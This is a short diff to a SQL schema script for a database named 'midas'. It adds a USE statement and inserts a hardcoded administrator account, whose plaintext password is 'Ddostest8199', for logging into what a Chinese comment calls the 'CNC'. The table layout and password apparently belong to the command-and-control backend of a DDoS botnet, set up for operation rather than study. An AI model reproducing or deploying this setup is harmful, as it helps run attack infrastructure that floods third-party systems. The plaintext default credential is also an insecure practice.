@@ -1,4 +1,5 @@
 CREATE DATABASE midas;
+USE midas;
 
 CREATE TABLE `history` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
@@ -34,3 +35,6 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
+
+#username和password是登录CNC的管理员账户，midas, Ddostest8199
+INSERT INTO users VALUES (NULL, 'midas', 'Ddostest8199', 0, 0, 0, 0, -1, 1, 30, '');
